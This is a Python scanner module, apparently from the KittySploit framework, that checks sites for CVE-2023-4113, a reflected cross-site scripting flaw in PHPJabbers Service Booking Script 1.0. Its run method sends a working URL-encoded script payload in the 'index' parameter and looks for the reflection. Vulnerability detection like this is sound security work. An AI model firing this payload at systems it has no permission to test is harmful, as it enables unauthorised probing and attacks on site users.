#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability was found in PHP Jabbers Service Booking Script 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHPJabbers Service Booking Script 1.0 - Cross Site Scripting Detection',
        'description': 'A vulnerability was found in PHP Jabbers Service Booking Script 1.0. It has been declared as problematic. This vulnerability affects unknown code of the file /index.php. The manipulation of the argument index leads to cross site scripting. The attack can be initiated remotely.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'packetstorm', 'xss', 'php', 'jabbers', 'phpjabbers', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'http://packetstormsecurity.com/files/173931/PHPJabbers-Service-Booking-Script-1.0-Cross-Site-Scripting.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-4113',
            'https://vuldb.com/?ctiid.235960',
            'https://vuldb.com/?id.235960',
        ],
        'cve': 'CVE-2023-4113',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?controller=pjFrontPublic&action=pjActionServices&locale=1&index=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('Select Service(s)', '><script>alert(document.domain)</script>',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="PHPJabbers Service Booking Script 1.0 - Cross Site Scripting detected",
                path='/index.php?controller=pjFrontPublic&action=pjActionServices&locale=1&index=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E',
            )
            return True
        return False

